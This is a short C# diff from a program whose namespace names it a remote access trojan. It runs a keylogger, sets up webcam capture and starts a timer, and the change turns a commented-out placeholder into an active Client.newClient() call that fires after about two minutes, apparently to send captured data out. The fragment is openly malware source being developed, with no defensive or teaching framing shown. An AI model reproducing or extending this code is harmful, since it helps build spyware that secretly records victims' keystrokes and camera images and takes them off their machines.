@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
@@ -16,9 +17,6 @@ namespace remote_access_trojan
             Keylogger.Run();
             webcam = new Webcam();
             SetTimer();
-
-            // Client.ZipFiles();
-            //  Client.newClient();
 
             // Do not move - this needs to be the last line
             Application.Run();
@@ -39,7 +37,7 @@ namespace remote_access_trojan
             // 2 minutes is up
             if (timerCount >= 24)
             {
-                // Client.SendFile()
+                Client.newClient();
                 timer.Stop();
                 return;
             }
